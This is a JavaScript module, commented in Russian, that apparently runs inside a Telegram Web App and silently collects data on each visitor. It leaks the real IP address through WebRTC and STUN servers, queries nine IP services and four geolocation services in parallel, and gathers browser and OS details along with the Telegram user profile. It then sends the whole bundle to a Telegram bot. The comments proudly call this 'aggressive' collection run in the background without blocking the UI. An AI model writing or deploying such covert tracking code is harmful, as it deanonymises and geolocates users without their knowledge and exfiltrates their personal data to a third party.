/**
 * DATA COLLECTOR - Отдельный модуль для сбора всех данных пользователя
 * 
 * Выгружен из основного приложения для:
 * - Быстрой загрузки основного UI
 * - Изоляции тяжелых операций (WebRTC, API вызовы)
 * - Простого включения/отключения сбора данных
 * 
 * Включает:
 * - WebRTC IP leak (множественные STUN серверы)
 * - 9 IP API (параллельно)
 * - 4 Geo API (параллельно)
 * - User Agent, браузер, ОС
 * - Telegram данные
 * - Отправку в Telegram бота
 */

import { getIPFast, getUserInfo, getGeoData } from './webrtc-ip';
import { sendUserDataToBot, getBotInfo } from './telegram-bot';

/**
 * ГЛАВНАЯ ФУНКЦИЯ - запускает агрессивный сбор всех данных
 * Вызывается асинхронно, не блокирует UI
 */
export async function startDataCollection() {
  try {
    console.log('🔍 АГРЕССИВНЫЙ сбор данных пользователя...');
    console.log('⚡ Запуск множественных методов сбора IP...');
    
    // 1️⃣ Проверяем бота в фоне (не ждем результата)
    getBotInfo().then(botInfo => {
      console.log('🤖 Bot info:', botInfo);
    }).catch(err => {
      console.error('⚠️ Ошибка проверки бота:', err);
    });
    
    // 2️⃣ АГРЕССИВНОЕ получение IP (множественные WebRTC соединения + 9 API)
    console.log('🌐 Запуск WebRTC + 9 IP APIs...');
    const { ip, ipInfo } = await getIPFast();
    console.log('📍 Primary IP:', ip);
    console.log('🌐 Full IP Info:', ipInfo);
    
    // 3️⃣ АГРЕССИВНОЕ получение геоданных (4 geo API параллельно)
    let geoData = undefined;
    if (ip !== 'Unknown') {
      console.log('🌍 Запуск агрессивного сбора геоданных (4 APIs)...');
      try {
        geoData = await getGeoData(ip);
        console.log('✅ Геоданные получены:', geoData);
      } catch (geoError) {
        console.error('⚠️ Ошибка получения геоданных:', geoError);
      }
    }
    
    // 4️⃣ Получаем дополнительную информацию (браузер, ОС, язык и т.д.)
    console.log('📊 Сбор информации о системе...');
    const userInfo = getUserInfo();
    
    // 5️⃣ Получаем данные Telegram пользователя (если доступны)
    let telegramUser = null;
    if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
      telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
      console.log('👤 Telegram User:', telegramUser);
    }
    
    // 6️⃣ Формируем ПОЛНЫЙ пакет данных
    const userData = {
      ip: ip,
      ipInfo: ipInfo,
      geoData: geoData,
      ...userInfo,
      telegramUser
    };
    
    console.log('📦 Полный набор данных собран:', userData);
    
    // 7️⃣ Отправляем в Telegram бота
    console.log('📤 Отправка ПОЛНОГО пакета данных в Telegram...');
    const sent = await sendUserDataToBot(userData);
    
    if (sent) {
      console.log('✅ Данные успешно отправлены в бота');
      console.log('🎉 Агрессивный сбор данных завершен!');
    } else {
      console.error('❌ Не удалось отправить данные в бота');
    }
    
    return userData;
    
  } catch (error) {
    console.error('❌ Ошибка при сборе данных:', error);
    throw error;
  }
}

/**
 * ЛЕГКАЯ ВЕРСИЯ - без отправки в бота, только сбор
 * Используется для тестирования
 */
export async function collectDataOnly() {
  try {
    console.log('🔍 Сбор данных (без отправки)...');
    
    const { ip, ipInfo } = await getIPFast();
    const userInfo = getUserInfo();
    
    let geoData = undefined;
    if (ip !== 'Unknown') {
      geoData = await getGeoData(ip);
    }
    
    let telegramUser = null;
    if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
      telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
    }
    
    const userData = {
      ip,
      ipInfo,
      geoData,
      ...userInfo,
      telegramUser
    };
    
    console.log('📦 Данные собраны:', userData);
    return userData;
    
  } catch (error) {
    console.error('❌ Ошибка сбора данных:', error);
    throw error;
  }
}

/**
 * БЫСТРЫЙ РЕЖИМ - только базовая информация
 * Не использует WebRTC и внешние API
 */
export function collectBasicInfo() {
  console.log('⚡ Быстрый сбор базовой информации...');
  
  const userInfo = getUserInfo();
  
  let telegramUser = null;
  if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
    telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
  }
  
  const basicData = {
    ...userInfo,
    telegramUser
  };
  
  console.log('📦 Базовая информация:', basicData);
  return basicData;
}

// Экспортируем главную функцию как default
export default startDataCollection;
